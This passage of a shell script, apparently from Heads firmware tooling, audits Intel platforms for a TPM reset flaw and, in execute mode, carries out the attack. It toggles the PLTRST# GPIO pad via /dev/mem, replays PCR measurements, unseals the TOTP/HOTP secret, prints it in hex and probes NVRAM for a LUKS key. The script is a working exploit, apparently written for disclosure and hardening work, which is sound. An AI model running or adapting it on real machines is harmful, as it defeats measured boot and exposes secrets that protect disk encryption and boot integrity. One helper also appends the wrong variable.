			STATUS_OK "TPM startup complete (NVRAM preserved)"
		else
			DEBUG "tpm2 startup -c failed: $_startup_out"
		fi
	else
		DEBUG "tpm2 not available; TPM may need startup via kernel"
	fi

	INFO "  Recreating TPM encrypted sessions (tpmr.sh startsession)..."
	if command -v tpmr.sh >/dev/null 2>&1; then
		if tpmr.sh startsession 2>/dev/null; then
			STATUS_OK "TPM sessions recreated (NVRAM preserved)"
		else
			WARN "  Could not recreate TPM sessions. Unseal will fail."
		fi
	else
		DEBUG "tpmr.sh not available; cannot recreate sessions"
	fi

	# Verify PLTRST# bus reset vs software-only startup
	if [ -r /sys/class/tpm/tpm0/pcrs ]; then
		STATUS_OK "PLTRST# assertion CONFIRMED -- bus reset detected by kernel TPM driver."
		_pcr0_line=$(grep '^PCR-00' /sys/class/tpm/tpm0/pcrs 2>/dev/null | tail -1)
		DEBUG "    sysfs PCR-00: $_pcr0_line"
		_pcr0_val=$(echo "$_pcr0_line" | awk -F': ' '{print $2}' | tr -d ' ')
		DEBUG "    PCR 0: $_pcr0_val"
		if [ -n "$_pcr0_val" ]; then
			STATUS_OK "TPM is responsive (PCR 0 readable via sysfs)"
		else
			WARN "Cannot read PCR 0 via sysfs -- TPM not responsive."
		fi
	else
		DEBUG "    /sys/class/tpm/tpm0/pcrs NOT FOUND"
		STATUS "  PLTRST# assertion NOT confirmed -- no bus reset detected."
		INFO "  PCR clearing is from software TPM2_Startup(CLEAR) only, not"
		INFO "  from PLTRST#. Platform may not be susceptible to this attack vector."
		GPIO_FAILED="y"
	fi

	# Restore original pad config (cleanup, safe after TPM startup)
	if [ "$_cur_mode" = "0" ]; then
		DEBUG "  restoring original GPIO config (cleanup after TPM startup)"
		mem_write32 "$TARGET_ADDR" "$_dw0_val"
		mem_write32 "$((TARGET_ADDR + 4))" "$_dw1_val"
	fi

	if [ "$GPIO_FAILED" = "y" ]; then
		INFO "  TPM GPIO reset via $MECHANISM: procedure complete -- PLTRST# NOT confirmed"
	else
		INFO "  TPM GPIO reset via $MECHANISM: COMPLETE"
	fi
}

perform_tpm_gpio_reset() {
	TRACE_FUNC

	if [ "$PLATFORM_UNKNOWN" = "y" ]; then
		section "4. TPM GPIO ASSERTION (assert PLTRST# via PCH pad)"
		DEBUG "Platform unknown, cannot assert PLTRST#"
		INFO "Platform unknown; cannot assert PLTRST#."
		return
	fi

	if [ "$EXECUTE_MODE" != "y" ]; then
		return
	fi

	section "4. TPM GPIO ASSERTION (assert PLTRST# via PCH pad)"

	if [ ! -w /dev/mem ]; then
		DEBUG "/dev/mem not writable"
		DIE "/dev/mem is not writable. Cannot assert PLTRST#."
	fi

	DEBUG "PLTRST# assertion mechanism: $MECHANISM"
	DEBUG "Target address: $TARGET_ADDR_HEX"

	# Lock register check (PADCFGLOCK + PADCFGLOCKTX)
	check_lock_registers

	# Shutdown TPM and save configuration
	pre_assertion_setup

	# Assert PLTRST# via GPIO toggle
	assert_pltrst

	# Post-assertion: TPM startup, session recreation, bus reset check
	post_assertion_cleanup

	# --- DW1 manipulation test (experimental diagnostics) ---
	# Tests DW1 write behavior. Gated behind DEBUG_MODE.
	if [ "$DEBUG_MODE" = "y" ]; then
		DEBUG "DW1 manipulation test:"
		for _dw1_test_val in 0x00000000 0xFFFFFFFF; do
			mem_write32 "$((TARGET_ADDR + 4))" "$_dw1_test_val"
			_dw1_rb=$(mem_read32 "$((TARGET_ADDR + 4))")
			_dw1_rb_dec=$(( 16#$_dw1_rb ))
			_match=$(( _dw1_test_val == _dw1_rb_dec ? 1 : 0 ))
			DEBUG "  DW1 write 0x$(printf '%08x' $_dw1_test_val) -> readback 0x$_dw1_rb (match=$_match)"
		done
		mem_write32 "$((TARGET_ADDR + 4))" "0x$(printf '%08x' $_dw1_val)"
		DEBUG "  DW1 restored to 0x$(printf '%08x' $_dw1_val)"
	fi

	# --- DW1 effect test (experimental diagnostics) ---
	if [ "$DEBUG_MODE" = "y" ]; then
		DEBUG "  DW1 effect test: writing 0x00000000 to DW1 (DW0 unchanged)..."
		mem_write32 "$((TARGET_ADDR + 4))" "0x00000000"
		sleep 1
		_orig_dw1_hex=$(printf '0x%08x' $_dw1_val)
		mem_write32 "$((TARGET_ADDR + 4))" "$_orig_dw1_hex"
		DEBUG "  DW1 restored to $_orig_dw1_hex"
	fi
}

# ---- Read all PCRs (single-PCR reads to avoid hang) -------------------
#
# After GPIO assertion, tpm2 pcrread sha256 (all PCRs) hangs.
# Single-PCR reads work. This helper reads PCRs 0-7 and writes them
# to the specified output file (or stdout if no file specified).
# Usage: read_all_pcrs [output_file]

read_all_pcrs() {
	TRACE_FUNC
	_outfile="${1:-/dev/stdout}"
	_pcr_data=""
	for _pcr_idx in 0 1 2 3 4 5 6 7; do
		_pcr_line=$(tpm2 pcrread "sha256:$_pcr_idx" 2>/dev/null | \
			grep -E '^\s*[0-9]+\s*:' | tail -1)
		_pcr_data="$PCR_DATA
$_pcr_line"
	done
	_pcr_data="${_pcr_data#
}"
	if [ "$_outfile" = "/dev/stdout" ]; then
		echo "$_pcr_data"
	else
		echo "$_pcr_data" > "$_outfile"
		DEBUG "PCR data written to $_outfile"
	fi
	echo "$_pcr_data"
}

# ---- Verify reset by reading PCRs -------------------------------------

verify_pcrs() {
	TRACE_FUNC

	if [ "$EXECUTE_MODE" != "y" ]; then
		return
	fi

	section "5. PCR VERIFICATION"

	# Use single-PCR reads via tpm2 pcrread sha256:N.
	# tpm2 pcrread sha256 (all PCRs) hangs after GPIO assertion;
	# single-PCR reads work. pcrs() calls the all-PCR path.
	INFO "  Reading post-assertion PCR state (single-PCR reads)..."
	POST_RESET_PCRS=""
	for _pcr_idx in 0 1 2 3 4 5 6 7; do
		_pcr_line=$(tpm2 pcrread "sha256:$_pcr_idx" 2>/dev/null | \
			grep -E '^\s*[0-9]+\s*:' | tail -1)
		POST_RESET_PCRS="$POST_RESET_PCRS
$_pcr_line"
	done
	POST_RESET_PCRS="${POST_RESET_PCRS#
}"
	if [ -z "$POST_RESET_PCRS" ]; then
		WARN "  Could not read PCR values"
		return
	fi
	STATUS_OK "Post-assertion PCR state captured"

	# Check if PCR 2 changed (should be zero after PLTRST# pulse)
	_pcr2_val=$(echo "$POST_RESET_PCRS" | grep -E '^\s*2\s*:' | awk '{print $3}')
	DEBUG "  PCR 2 value: $_pcr2_val"
	if [ -z "$_pcr2_val" ] || [ "$_pcr2_val" = "0x0000000000000000000000000000000000000000000000000000000000000000" ]; then
		STATUS_OK "PCR 2 is zero -- TPM was cleared"
	else
		WARN "  PCR 2 is non-zero -- PLTRST# assertion may not have cleared TPM"
		DEBUG "  PCR 2 value: $_pcr2_val"
	fi

	# Show PCR state in debug log
	DEBUG "Post-assertion PCR state:"
	DEBUG "$POST_RESET_PCRS"
}

# ---- Replay PCR measurements via tpmr.sh infrastructure ----------------
#
# PCR 2: cbmem -L parsed via tpmr.sh AWK_PROG (handles all 3 log formats).
# PCR 4,5,7: /tmp/measuring_trace.log parsed generically for all PCR extends.
#
# Uses tpm2 pcrextend directly because tpmr.sh extend (-ic/-if) always
# re-hashes its input before extending. We need to replay pre-computed
# hashes from the measurement log verbatim; re-hashing would produce
# different digests that don't match the sealing policy.

# Helper: detect hash algorithm from hash length
_hash_algo() {
	TRACE_FUNC
	_hash_len="${#1}"
	DEBUG "_hash_algo: input len=$_hash_len"
	case "$_hash_len" in
		40) echo "sha1" ;;
		64) echo "sha256" ;;
		*) WARN "Unknown hash length: $_hash_len"; return 1 ;;
	esac
}

replay_measurements() {
	TRACE_FUNC

	if [ "$EXECUTE_MODE" != "y" ]; then
		return
	fi

	section "6. MEASUREMENT REPLAY"

	# Source tpmr.sh for AWK_PROG (parses all 3 cbmem -L formats)
	if [ -z "$AWK_PROG" ]; then
		# shellcheck source=/dev/null
		. /bin/tpmr.sh 2>/dev/null
	fi

	# --- PCR 2: coreboot SRTM from cbmem -L ---
	INFO "  Replaying PCR 2 (coreboot SRTM) from cbmem -L..."
	_log=$(cbmem -L 2>/dev/null)
	if [ -z "$_log" ]; then
		WARN "  cbmem -L returned no output"
	else
		# Detect algorithm from TPM version (SHA-256 for TPM 2.0, SHA-1 for TPM 1.2)
		_tpm_alg="sha256"
		command -v tpm2 >/dev/null 2>&1 || _tpm_alg="sha1"
		_pcr2_hashes=$(echo "$_log" | awk -v alg="$_tpm_alg" -v pcr="2" -f <(echo "$AWK_PROG") 2>/dev/null)
		if [ -n "$_pcr2_hashes" ]; then
			_count=0
			while read -r _hash; do
				[ -z "$_hash" ] && continue
				_algo=$(_hash_algo "$_hash") || continue
				tpm2 pcrextend "2:$_algo=$_hash" 2>/dev/null
				_count=$(( _count + 1 ))
			done <<< "$_pcr2_hashes"
			STATUS_OK "PCR 2: replayed $_count extends from cbmem -L"
		else
			WARN "  No PCR 2 hashes extracted from cbmem -L"
		fi
	fi

	# --- PCR 4,5,7: Heads extends from measuring_trace.log ---
	INFO "  Replaying Heads extends from /tmp/measuring_trace.log..."
	if [ -r /tmp/measuring_trace.log ]; then
		# Parse all "Extended PCR[N] with hash <hex_hash>" lines
		# Format: INFO: TPM: Extended PCR[7] with hash 96ab5053e4630a040d55549ba73cff2178d401d763147776771f9774597b86a1
		_lines=$(grep "Extended PCR\[" /tmp/measuring_trace.log 2>/dev/null)
		if [ -n "$_lines" ]; then
			_total=0
			while read -r _line; do
				_pcr=$(echo "$_line" | grep -o 'PCR\[[0-9]*\]' | grep -o '[0-9]*')
				_hash=$(echo "$_line" | grep -o 'hash [0-9a-f]*' | cut -d' ' -f2)
				if [ -n "$_pcr" ] && [ -n "$_hash" ]; then
					_algo=$(_hash_algo "$_hash") || continue
					tpm2 pcrextend "${_pcr}:$_algo=$_hash" 2>/dev/null
					_total=$(( _total + 1 ))
					DEBUG "PCR $_pcr extend: $_hash ($_algo)"
				fi
			done <<< "$_lines"
			STATUS_OK "Heads extends: replayed $_total operations from measuring_trace.log"
		else
			WARN "  No Heads extends found in measuring_trace.log"
		fi
	else
		WARN "  /tmp/measuring_trace.log not available"
	fi

	# Show final PCR state (single-PCR reads, all-PCR pcrs hangs after GPIO)
	INFO "  Final PCR state after replay:"
	for _pcr_idx in 0 1 2 3 4 5 6 7; do
		tpm2 pcrread "sha256:$_pcr_idx" 2>/dev/null | \
			grep -E '^\s*[0-9]+\s*:' | tail -1
	done

}

# ---- Attempt secret extraction ----------------------------------------

attempt_secret_extraction() {
	TRACE_FUNC

	if [ "$EXECUTE_MODE" != "y" ]; then
		DEBUG "audit mode: skipping secret extraction"
		return
	fi

	section "7. SECRET EXTRACTION ATTEMPT"

	# --- 7a. TOTP unseal ---
	INFO "  7a. Attempting TOTP secret unseal..."
	DEBUG "Attempting unseal at NVRAM index 0x4d47 (TOTP/HOTP)"
	_totp_secret="/tmp/secret/totp.key.tmp"
	rm -f "$_totp_secret" 2>/dev/null

	if command -v tpmr.sh >/dev/null 2>&1; then
		DEBUG "Running: tpmr.sh unseal 4d47 0,1,2,3,4,7 312 $_totp_secret"
		if tpmr.sh unseal 4d47 0,1,2,3,4,7 312 "$_totp_secret" 2>/dev/null; then
			STATUS_OK "TOTP secret unsealed successfully!"
			INFO "  Secret saved to $_totp_secret"
			if [ -s "$_totp_secret" ]; then
				INFO "  Secret hex: $(xxd -p < "$_totp_secret" | tr -d '\n')"
			fi
		else
			INFO "TOTP unseal failed. Expected if PCRs don't match the"
			INFO "sealing policy, or if no TOTP secret was ever sealed."
		fi
	else
		WARN "tpmr.sh not available; cannot unseal."
	fi
	DEBUG ""

	# --- 7b. HOTP unseal ---
	INFO "  7b. Attempting HOTP secret unseal..."
	_hotp_secret="/tmp/secret/hotp.key.tmp"
	rm -f "$_hotp_secret" 2>/dev/null
	DEBUG "Attempting unseal at NVRAM index 0x4d47 for HOTP"

	if command -v tpmr.sh >/dev/null 2>&1; then
		if tpmr.sh unseal 4d47 0,1,2,3,4,7 312 "$_hotp_secret" 2>/dev/null; then
			STATUS_OK "HOTP secret unsealed successfully!"
			INFO "  Secret saved to $_hotp_secret"
		else
			INFO "HOTP unseal failed (same secret as TOTP, expected)."
		fi
	fi
	DEBUG ""

	# --- 7c. LUKS DUK ---
	INFO "  7c. Attempting LUKS DUK unseal..."
	# The LUKS DUK index varies. Try common ones.
	for _idx in 0x81000001 0x81000002; do
		DEBUG "Probing NVRAM index $_idx for DUK"
		if command -v tpm2 >/dev/null 2>&1; then
			if tpm2 nvread "$_idx" 2>/dev/null; then
				DEBUG "DUK read succeeded from $_idx"
				STATUS_OK "LUKS DUK read succeeded from $_idx!"
				INFO "  NVRAM index $_idx is readable without auth after reset."
			fi
		fi
	done
	DEBUG ""

	# Summary
	DEBUG ""
	if [ -s "$_totp_secret" ]; then
		DEBUG "TOTP secret extracted successfully"
		DEBUG ""
		INFO "======================================================================"
		INFO "  ATTACK DEMONSTRATED: TPM secrets were extracted after PLTRST# assertion!"
		INFO "======================================================================"
		DEBUG ""
		INFO "  By asserting PLTRST# via GPIO ($MECHANISM on $GLOBAL_PCH) and replaying the"
		INFO "  measurement log, the following secrets were recovered:"
		INFO "    - TOTP/HOTP secret: YES"
		DEBUG ""
		INFO "  This proves the PLTRST# GPIO assertion bypasses the TPM's measured"
		INFO "  boot attestation on this platform."
	else
		DEBUG "No secrets extracted"
		INFO "No secrets were extracted. This is expected if no secrets"
		INFO "were sealed, or if the replay did not match the sealing policy."
	fi
}

# ---- Main -------------------------------------------------------------

usage() {
	cat >&2 <<USAGE_END
Usage: $SCRIPT_NAME [OPTIONS]

Options:
  --audit, -a             Safe audit: detect platform, report vulnerability
                           (no GPIO manipulation)
  --execute, --exec, -x   Assert PLTRST# via GPIO and replay measurements
                           (without this flag: no action, use --help)
  --help, -h              Show this help

This script demonstrates the TPM GPIO assertion attack on affected Intel
platforms. It detects the PCH via PCI ISA bridge device ID, reads PLTRST#
register state, asserts PLTRST# via GPIO (preserving NVRAM), replays PCR
measurements, and attempts TOTP/HOTP secret extraction.

USAGE_END
	exit 1
}

main() {
	TRACE_FUNC
	EXECUTE_MODE="n"
	AUDIT_MODE="n"
	PLATFORM_UNKNOWN="n"
	NOT_VULNERABLE="n"
	MECHANISM=""
	PCR_BASE=""
	GLOBAL_PCH=""
	GPIO_FAILED="n"
	BUS_LOCKED_COUNT=0
	BUS_TOTAL_COUNT=0
	MEASUREMENT_FILE="/tmp/measurements"

	DEBUG "SCRIPT_VERSION=2026-07-21-v4 EXECUTE_MODE=$EXECUTE_MODE"
	DEBUG "main: argc=$# argv=$*"

	if [ $# -eq 0 ]; then
		usage
	fi

	# Parse arguments
	for _arg in "$@"; do
		DEBUG "main: parsing argument '$_arg'"
		case "$_arg" in
			--audit|-a)
				AUDIT_MODE="y"
				DEBUG "AUDIT_MODE=y" ;;
			--execute|--exec|-x)
				EXECUTE_MODE="y"
				DEBUG "EXECUTE_MODE=y" ;;
			--help|-h)
				usage ;;
			*)
				WARN "Unknown option: $_arg"
				usage ;;
		esac
	done

	# Fallback: check $1 directly if loop didn't run (sourced scripts lose $@)
	if [ "${1:-}" = "--execute" ] || [ "${1:-}" = "--exec" ] || [ "${1:-}" = "-x" ]; then
		EXECUTE_MODE="y"
		DEBUG "EXECUTE_MODE=y (via \$1 fallback)"
	fi
	DEBUG "main: AUDIT_MODE=$AUDIT_MODE EXECUTE_MODE=$EXECUTE_MODE"

	detect_platform

	# Print banner and compact audit header AFTER platform detection so
	# $GLOBAL_PCH and $_dev_id are populated.
	if [ "$AUDIT_MODE" = "y" ]; then
		print_audit_header
	else
		print_banner
	fi

	if [ "$EXECUTE_MODE" = "y" ]; then
		DEBUG "main: execute mode confirmed, showing warning with NOTE delay"
		DEBUG ""
		INFO "  *** EXECUTE MODE ***"
		WARN "This asserts PLTRST# via GPIO. PCRs cleared, NVRAM preserved. Sealed secrets become accessible once PCRs are re-extended."
		DEBUG ""
		NOTE "Press Ctrl+C within 3 seconds to abort..."
	fi
	calculate_registers
	read_pad_config
	check_bus_pin_locks
	# Pre-assertion PCR snapshot (execute only)
	if [ "$EXECUTE_MODE" = "y" ]; then
		INFO "  Capturing pre-assertion PCR state..."
		PRE_RESET_PCRS=$(pcrs 2>/dev/null)
		DEBUG "Pre-assertion PCR snapshot captured"
	fi
	perform_tpm_gpio_reset
	if [ "$GPIO_FAILED" = "y" ]; then
		DEBUG "GPIO assertion failed; skipping PCR verify, replay, and secret extraction"
	else
		verify_pcrs
		replay_measurements
		attempt_secret_extraction
	fi

	# Summary
	section "SUMMARY"

	if [ "$PLATFORM_UNKNOWN" = "y" ]; then
		DEBUG "Summary: PLATFORM_UNKNOWN=y, exiting with 0"
		INFO "  Platform not recognized or not in the vulnerability database."
		DEBUG ""
			INFO "  Known affected platforms (by PCI device ID):"
			INFO "  - CNP-LP (0x9d84): GPIO PAD_CFG (PLTRST_CPU_B, port 0x6b)"
			INFO "  - SPT/KBP (0xa14*/0xa2c*): GPIO PAD_CFG (GPP_B13, port 0xaf)"
			INFO "  - CML-DT (0x0684-0x068f): GPIO PAD_CFG (GPP_B13, port 0xaf)"
			INFO "  - CML_U (0x0660-0x0661): GPIO PAD_CFG (GPP_B13, port 0x6e)"
			INFO "  - CFL_S (0xa303-0xa30e): GPIO PAD_CFG (GPP_B13, port 0x6e)"
			INFO "  - TGL (0xa08*/0xa0a*): GPIO PAD_CFG (GPP_B13, port 0x6e)"
			INFO "  - ADL-P (0x518*): GPIO PAD_CFG (GPP_B13, port 0x6e)"
		INFO "  - RPL-P (0x519*): GPIO PAD_CFG (GPP_B13, port 0x6d)"
		INFO "  - ADL-S (0x7a8*): GPIO PAD_CFG (GPP_B13, port 0x6d)"
			INFO "  - RPL-S (0x7a0*): GPIO PAD_CFG (GPP_B13, port 0x6d)"
			INFO "  - ARL-S (0x7e2*): GPIO PAD_CFG (GPP_B13, port 0x6d)"
			DEBUG ""
		INFO "  Known NOT affected:"
		INFO "  - Pre-Skylake: dedicated PLTRST pin"
		INFO "  - Meteor Lake (0x7e00-0x7e07): GPIO lock infrastructure compiled, per-pad enforcement unconfigured"
		DEBUG ""
		exit 0
	fi

	if [ "$EXECUTE_MODE" = "y" ]; then
		DEBUG "Summary: attack executed, exiting with 3"
		DEBUG ""
		INFO "  Platform class: $GLOBAL_PCH"
		if [ "$MECHANISM" = "GPIO_PAD_CFG" ]; then
			INFO "  Attack method: GPIO PAD_CFG (PLTRST_CPU_B pad $PLTRST_PAD)"
		else
			INFO "  Attack method: GPIO PAD_CFG via PCR MMIO"
		fi
		DEBUG ""
		DEBUG "PCR comparison: PRE_RESET_PCRS (non-zero, coreboot measurements) vs POST_RESET_PCRS (should be zero after assertion, restored after replay)"
		[ -n "$PRE_RESET_PCRS" ] && DEBUG "Pre-assertion PCR 2 was non-zero (contains coreboot SRTM measurements)"
		if [ "$GPIO_FAILED" = "y" ]; then
			INFO "  PLTRST# GPIO assertion was ATTEMPTED but NOT confirmed."
			INFO "  No bus reset detected by kernel TPM driver (/sys/class/tpm/tpm0/pcrs absent)."
			INFO "  PCR clearing is from software TPM2_Startup(CLEAR) only."
			INFO "  Platform may not be susceptible to this attack via GPIO PLTRST# assertion."
		else
			INFO "  PLTRST# GPIO assertion attack was EXECUTED on this platform."
			INFO "  PLTRST# assertion complete. PCRs are cleared."
			INFO "  NVRAM sealed blobs preserved (accessible once PCRs are re-extended)."
		fi
		DEBUG ""
		exit 3
	else
		DEBUG "Summary: vulnerable platform in audit mode, exiting with 2"
		# Tier-based vulnerability summary: tier-1 (SPT_KBP) confirms
		# vulnerability; tier-3 (ADL_P, RPL_P, ADL_S, RPL_S) reports
		# uncertainty from NV4x hardware test results.
		case "$GLOBAL_PCH" in
			ADL_P|RPL_P|ADL_S|RPL_S)
				INFO "  Platform $GLOBAL_PCH (device $GLOBAL_DEV_ID) -- VULNERABILITY UNCERTAIN."
				INFO "  PLTRST# pad is accessible via GPIO community at port $(printf "0x%x" $COMMUNITY_PORT)"
				INFO "  and is not locked by firmware (PADCFGLOCK not set)."
				INFO "  However, hardware test on NV4x ADL-P shows mode bits [13:10]"
				INFO "  and TX[0] are write-ignored at PCH die level despite PADCFGLOCK=0."
				INFO "  PLTRST# assertion NOT confirmed on this PCH die."
				INFO "  Bus pin lock status: $BUS_LOCKED_COUNT/$BUS_TOTAL_COUNT pins locked"
				DEBUG ""
				INFO "  Action: physical scope verification needed." ;;
			*)
				INFO "  Platform $GLOBAL_PCH (device $GLOBAL_DEV_ID) is VULNERABLE."
				INFO "  PLTRST# pad is accessible via GPIO community at port $(printf "0x%x" $COMMUNITY_PORT)"
				INFO "  and is not locked by firmware (PADCFGLOCK not set)."
				INFO "  Bus pin lock status: $BUS_LOCKED_COUNT/$BUS_TOTAL_COUNT pins locked"
				INFO "  An OS with /dev/mem access can reset the TPM without"
				INFO "  platform reset, clearing all PCRs."
				DEBUG ""
				INFO "  Action: ensure coreboot locks this pad via gpio_lock_pad()"
				INFO "  or PAD_CFG_NF_LOCK(). Without a lock, the TPM measured"
				INFO "  boot chain is bypassable from the OS."
				DEBUG ""
				INFO "  Run with --execute to demonstrate the actual attack." ;;
		esac
		DEBUG ""
		exit 2
	fi
}

main "$@"
